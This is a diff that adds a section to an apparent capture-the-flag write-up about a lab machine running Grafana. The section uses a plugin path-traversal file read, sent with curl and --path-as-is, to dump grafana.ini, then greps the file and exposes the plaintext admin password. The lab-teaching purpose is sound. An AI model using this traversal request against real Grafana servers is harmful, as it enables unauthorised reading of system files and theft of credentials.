@@ -377,3 +377,57 @@ consul:x:997:997::/home/consul:/bin/false
 ```
 
 <br />
+
+# Grafana Configuration Files:
+
+<br />
+
+Now that we have an LFI, we proceed to list the paths of the most interesting files of this software to try to get credentials or something interesting:
+
+<br />
+
+## grafana.ini (/etc/grafana/grafana.ini):
+
+<br />
+
+Grafana stores its configuration in the grafana.ini file, so we proceed to list this file:
+
+<br />
+
+```bash
+❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/grafana.ini" --path-as-is
+##################### Grafana Configuration Example #####################
+#
+# Everything has defaults so you only need to uncomment things you want to
+# change
+
+# possible values : production, development
+;app_mode = production
+
+# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
+;instance_name = ${HOSTNAME}
+
+#################################### Paths ####################################
+```
+
+<br />
+
+Once we have checked that the file exists, we proceed to list it again but by the word "password" and.... Surprise!! We have the password to the Grafana login panel!
+
+<br />
+
+```bash
+❯ curl -s -X GET "http://10.10.11.183:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/grafana/grafana.ini" --path-as-is | grep password
+# You can configure the database connection by specifying type, host, name, user and password
+# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
+;password =
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+;password_hint = password
+# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
+;password =
+; basic_auth_password =
+;password =
+```
+
+<br />
